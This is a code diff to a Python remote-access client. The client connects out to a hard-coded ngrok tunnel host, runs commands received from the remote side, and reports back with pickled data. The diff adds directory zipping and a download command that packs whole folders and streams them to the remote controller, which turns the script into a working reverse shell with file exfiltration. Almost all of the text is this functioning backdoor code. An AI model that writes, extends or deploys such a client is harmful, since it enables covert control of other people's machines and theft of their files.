@@ -1,22 +1,24 @@
 
+from inspect import getfile
 import os
-import pickle
 from pyclbr import Function
 import re
 import socket
-import subprocess
 
+import subprocess
+import pickle
+import zipfile
 from re import sub
 from typing import List, Union
 
 
-PORT: int = 4444
+PORT: int = 19801
 HEADER: int = 64
 FORMAT: str = "utf-8"
-HOST: str = socket.gethostbyname(socket.gethostname())
+HOST: str = "0.tcp.ngrok.io"#socket.gethostbyname(socket.gethostname())
 CLIENT: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ADDR: tuple = (HOST, PORT)
-CHUNK_SIZE: int = 1096
+CHUNK_SIZE: int = 1024 * 512
 
 
 def handle_error(func) -> Function:
@@ -26,6 +28,34 @@ def handle_error(func) -> Function:
         except Exception as e:
             self.send_pickled_data(False, "", str(e))
     return handle
+
+
+class Ziper:
+    @staticmethod
+    def zip(path: str) -> None:
+        original_path: str = os.getcwd()
+        os.chdir(path)
+        with zipfile.ZipFile(path + ".zip", "w") as z:
+            for file in Ziper.getFiles(path):
+                print(file)
+                z.write(file[len(path)+1:])
+        os.chdir(original_path)
+        print(os.getcwd())
+
+    @staticmethod
+    def unZip(path: str) -> None:
+        with zipfile.ZipFile(path, "r") as z:
+            z.extractall(os.path.basename(path[:-4]))
+
+    @staticmethod
+    def getFiles(path: str) -> list[str]:
+        result = []
+        for i in os.listdir(path):
+            if os.path.isdir(i := os.path.join(path, i)):
+                result += Ziper.getFiles(i)
+            else:
+                result.append(i)
+        return result
 
 
 class Client:
@@ -41,6 +71,7 @@ class Client:
             print("# connected ...")
             while True:
                 rc: str = self.recv().decode(FORMAT)
+                print(rc)
                 if (cm := rc.split(" ")[0]) in self.getnames():
                     getattr(self, "do_" + cm)(' '.join(rc.split(" ")[1:]))
                 else:
@@ -62,13 +93,15 @@ class Client:
 
     def send(self, msg: bytes) -> None:
         length: int = len(msg)
-        self.client.send(f"{length}{' ' * (HEADER - length)}".encode(FORMAT))
+        self.client.send(
+            f"{length}{' ' * (HEADER - len(str(length)))}".encode(FORMAT))
         self.client.send(msg)
 
     def recv(self) -> bytes:
         if (rc := self.client.recv(HEADER)):
             length: int = int(rc.decode(FORMAT))
             return self.client.recv(length)
+
         return rc
 
     def excute(self, command: str) -> str:
@@ -98,16 +131,28 @@ class Client:
         os.chdir(self._path_parse(arg.strip()))
         self.send_pickled_data(True, [self.do_ls(".", False), os.getcwd()], "")
 
+    def do_pwd(self, arg: str) -> None:
+        self.send(os.getcwd().encode(FORMAT))
+
     @handle_error
     def do_download(self, arg: str) -> None:
-        self.send_pickled_data(True, os.path.getsize(arg), "")
+        arg: str = os.path.join(os.getcwd(), arg)
+        if isdir := os.path.isdir(arg):
+            Ziper.zip(arg)
+            arg += ".zip"
+            print("DIRRR")
+
+        self.send_pickled_data(True, {"size": os.path.getsize(arg), "isdir": isdir}, "")
+
         with open(arg, "rb") as f:
             while True:
                 data: bytes = f.read(CHUNK_SIZE)
                 if not data:
                     break
                 self.client.send(data)
-        print("Done")
+        if isdir:
+            os.remove(arg)
+        print("# Done")
 
 
 client: Client = Client()
